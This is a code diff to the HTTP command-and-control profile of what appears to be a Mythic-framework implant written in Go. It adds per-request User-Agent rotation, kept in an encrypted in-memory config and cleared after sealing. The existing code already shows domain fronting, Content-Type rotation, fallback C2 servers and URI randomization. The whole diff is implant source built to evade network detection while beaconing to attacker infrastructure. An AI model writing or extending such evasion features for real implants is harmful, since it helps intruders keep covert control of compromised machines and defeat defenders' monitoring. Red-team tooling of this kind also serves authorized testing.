@@ -40,16 +40,17 @@ type configVault struct {
 // sensitiveConfig holds the C2 configuration fields that should not persist
 // as plaintext in memory. These reveal C2 infrastructure and enable traffic decryption.
 type sensitiveConfig struct {
-	BaseURL       string            `json:"b"`
-	FallbackURLs  []string          `json:"f,omitempty"`
-	UserAgent     string            `json:"a"`
-	EncryptionKey string            `json:"k"`
-	CallbackUUID  string            `json:"c"`
-	HostHeader    string            `json:"h"`
-	GetEndpoint   string            `json:"g"`
-	PostEndpoint  string            `json:"p"`
-	CustomHeaders map[string]string `json:"x,omitempty"`
-	ContentTypes  []string          `json:"ct,omitempty"`
+	BaseURL        string            `json:"b"`
+	FallbackURLs   []string          `json:"f,omitempty"`
+	UserAgent      string            `json:"a"`
+	UserAgentPool  []string          `json:"ap,omitempty"`
+	EncryptionKey  string            `json:"k"`
+	CallbackUUID   string            `json:"c"`
+	HostHeader     string            `json:"h"`
+	GetEndpoint    string            `json:"g"`
+	PostEndpoint   string            `json:"p"`
+	CustomHeaders  map[string]string `json:"x,omitempty"`
+	ContentTypes   []string          `json:"ct,omitempty"`
 }
 
 // HTTPProfile handles HTTP communication with Mythic
@@ -66,9 +67,11 @@ type HTTPProfile struct {
 	HostHeader    string            // Override Host header for domain fronting
 	CustomHeaders map[string]string // Additional HTTP headers from C2 profile
 	ContentTypes  []string          // Content-Type rotation pool for request body
+	UserAgentPool []string          // User-Agent rotation pool (if set, overrides single UserAgent)
 	client        *http.Client
 	CallbackUUID  string // Store callback UUID from initial checkin
 	ctIndex       atomic.Uint32 // Round-robin index for Content-Type rotation
+	uaIndex       atomic.Uint32 // Round-robin index for User-Agent rotation
 
 	// Fallback C2 URLs for automatic failover when primary is unreachable.
 	FallbackURLs []string
@@ -168,6 +171,7 @@ func (h *HTTPProfile) SealConfig() error {
 		BaseURL:       h.BaseURL,
 		FallbackURLs:  h.FallbackURLs,
 		UserAgent:     h.UserAgent,
+		UserAgentPool: h.UserAgentPool,
 		EncryptionKey: h.EncryptionKey,
 		CallbackUUID:  h.CallbackUUID,
 		HostHeader:    h.HostHeader,
@@ -203,6 +207,7 @@ func (h *HTTPProfile) SealConfig() error {
 	h.PostEndpoint = ""
 	h.CustomHeaders = nil
 	h.ContentTypes = nil
+	h.UserAgentPool = nil
 
 	return nil
 }
@@ -217,6 +222,7 @@ func (h *HTTPProfile) getConfig() *sensitiveConfig {
 			BaseURL:       h.BaseURL,
 			FallbackURLs:  h.FallbackURLs,
 			UserAgent:     h.UserAgent,
+			UserAgentPool: h.UserAgentPool,
 			EncryptionKey: h.EncryptionKey,
 			CallbackUUID:  h.CallbackUUID,
 			HostHeader:    h.HostHeader,
@@ -904,14 +910,23 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte, cfg *sensiti
 	hostHeader := h.HostHeader
 	var customHeaders map[string]string
 	var contentTypes []string
+	var uaPool []string
 	if cfg != nil {
 		userAgent = cfg.UserAgent
+		uaPool = cfg.UserAgentPool
 		hostHeader = cfg.HostHeader
 		customHeaders = cfg.CustomHeaders
 		contentTypes = cfg.ContentTypes
 	} else {
+		uaPool = h.UserAgentPool
 		customHeaders = h.CustomHeaders
 		contentTypes = h.ContentTypes
+	}
+
+	// Rotate User-Agent per request if pool is configured
+	if len(uaPool) > 0 {
+		idx := h.uaIndex.Add(1) - 1
+		userAgent = uaPool[idx%uint32(len(uaPool))]
 	}
 
 	// Resolve URI randomization tokens (e.g., /api/v{int:1-3}/{rand:8})
